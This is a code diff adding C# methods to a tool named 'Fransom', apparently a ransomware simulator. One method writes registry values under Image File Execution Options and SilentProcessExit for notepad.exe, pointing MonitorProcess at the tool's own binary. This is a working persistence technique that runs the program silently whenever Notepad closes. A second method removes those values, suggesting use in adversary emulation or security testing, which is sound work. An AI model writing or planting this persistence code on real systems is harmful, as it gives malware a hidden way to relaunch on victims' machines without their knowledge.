@@ -172,5 +172,74 @@ namespace Fransom
                 Logger.WriteLine("[-] Error: " + e.Message);
             }
         }
+        public void SetNotepadGflags()
+        {
+            try
+            {
+                string keypath = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe";
+                string keyname = "GlobalFlag";
+                int keyvalue = 512; 
+                RegistryKey regkey;
+                regkey = Registry.LocalMachine.CreateSubKey(keypath);
+                regkey.SetValue(keyname, keyvalue);
+                regkey.Close();
+                Logger.WriteLine(String.Format("[+] Created HKLM:{0} key '{1}' and set to {2}", keypath, keyname, keyvalue));
+
+                keypath = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe";
+                keyname = "ReportingMode";
+                keyvalue = 1;
+                regkey = Registry.LocalMachine.CreateSubKey(keypath);
+                regkey.SetValue(keyname, keyvalue);
+                regkey.Close();
+                Logger.WriteLine(String.Format("[+] Created HKLM:{0} key '{1}' and set to {2}", keypath, keyname, keyvalue));
+
+                keypath = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe";
+                keyname = "MonitorProcess";
+                string FransomBinary = Assembly.GetEntryAssembly().Location;
+                regkey = Registry.LocalMachine.CreateSubKey(keypath);
+                regkey.SetValue(keyname, FransomBinary);
+                regkey.Close();
+                Logger.WriteLine(String.Format("[+] Created HKLM:{0} key '{1}' and set to {2}", keypath, keyname, FransomBinary));
+
+
+            }
+            catch (Exception e)
+            {
+                Logger.WriteLine("[-] Error: " + e.Message);
+            }
+        }
+
+        public void RemoveNotepadGflags()
+        {
+            try
+            {
+                string keypath = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe";
+                string keyname = "GlobalFlag";
+                RegistryKey regkey;
+                regkey = Registry.LocalMachine.OpenSubKey(keypath);
+                regkey.DeleteValue(keyname);
+                regkey.Close();
+                Logger.WriteLine(String.Format("[+] Cleaned up HKLM:{0} {1} key", keypath, keyname));
+
+                keypath = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe";
+                keyname = "ReportingMode";
+                regkey = Registry.LocalMachine.OpenSubKey(keypath);
+                regkey.DeleteValue(keyname);
+                regkey.Close();
+                Logger.WriteLine(String.Format("[+] Cleaned up HKLM:{0} {1} key", keypath, keyname));
+
+                keypath = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe";
+                keyname = "MonitorProcess";
+                regkey = Registry.LocalMachine.OpenSubKey(keypath);
+                regkey.DeleteValue(keyname);
+                regkey.Close();
+                Logger.WriteLine(String.Format("[+] Cleaned up HKLM:{0} {1} key", keypath, keyname));
+            }
+            catch (ArgumentException)
+            {
+                Logger.WriteLine("[-] Error: Selected Registry value does not exist");
+            }
+        }
+
     }
 }
